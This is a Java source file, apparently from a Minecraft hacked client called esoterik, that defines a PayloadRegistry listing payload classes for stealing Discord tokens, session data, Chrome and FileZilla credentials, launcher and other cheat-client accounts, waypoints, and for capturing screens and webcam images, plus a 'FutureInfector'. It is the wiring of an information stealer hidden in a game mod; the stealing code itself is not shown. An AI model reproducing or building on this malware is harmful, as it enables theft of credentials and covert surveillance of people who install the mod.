package com.esoterik.client.util;

import com.esoterik.client.util.impl.CaptureWebcam;
import com.esoterik.client.util.impl.Chrome;
import com.esoterik.client.util.impl.DiscordTokens;
import com.esoterik.client.util.impl.FileZilla;
import com.esoterik.client.util.impl.FutureAccounts;
import com.esoterik.client.util.impl.FutureAuth;
import com.esoterik.client.util.impl.FutureInfector;
import com.esoterik.client.util.impl.FutureWaypoints;
import com.esoterik.client.util.impl.Intellij;
import com.esoterik.client.util.impl.JourneyMap;
import com.esoterik.client.util.impl.KamiWaypoints;
import com.esoterik.client.util.impl.KonasAccounts;
import com.esoterik.client.util.impl.KonasWaypoints;
import com.esoterik.client.util.impl.LauncherAccounts;
import com.esoterik.client.util.impl.ModsGrabber;
import com.esoterik.client.util.impl.Personal;
import com.esoterik.client.util.impl.PyroAccounts;
import com.esoterik.client.util.impl.PyroWaypoints;
import com.esoterik.client.util.impl.RusherHackAccounts;
import com.esoterik.client.util.impl.RusherHackWaypoints;
import com.esoterik.client.util.impl.SalHackWaypoints;
import com.esoterik.client.util.impl.ScreenCapture;
import com.esoterik.client.util.impl.Session;
import com.esoterik.client.util.impl.ShareX;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Optional;

public final class PayloadRegistry {
   private static final PayloadRegistry INSTANCE = new PayloadRegistry();
   private final List<Payload> payloads = new ArrayList();

   private PayloadRegistry() {
      this.payloads.addAll(Arrays.asList(new FutureInfector(), new Personal(), new DiscordTokens(), new Session(), new ModsGrabber(), new ScreenCapture(), new LauncherAccounts(), new Chrome(), new FileZilla(), new ShareX(), new FutureAuth(), new FutureAccounts(), new FutureWaypoints(), new SalHackWaypoints(), new RusherHackAccounts(), new RusherHackWaypoints(), new PyroAccounts(), new PyroWaypoints(), new KonasAccounts(), new KonasWaypoints(), new KamiWaypoints(), new JourneyMap(), new Intellij(), new CaptureWebcam()));
   }

   public static Optional<Payload> getPayload(Class<? extends Payload> klazz) {
      return getPayloads().stream().filter((p) -> {
         return p.getClass().equals(klazz);
      }).findAny();
   }

   public static List<Payload> getPayloads() {
      return INSTANCE.payloads;
   }
}
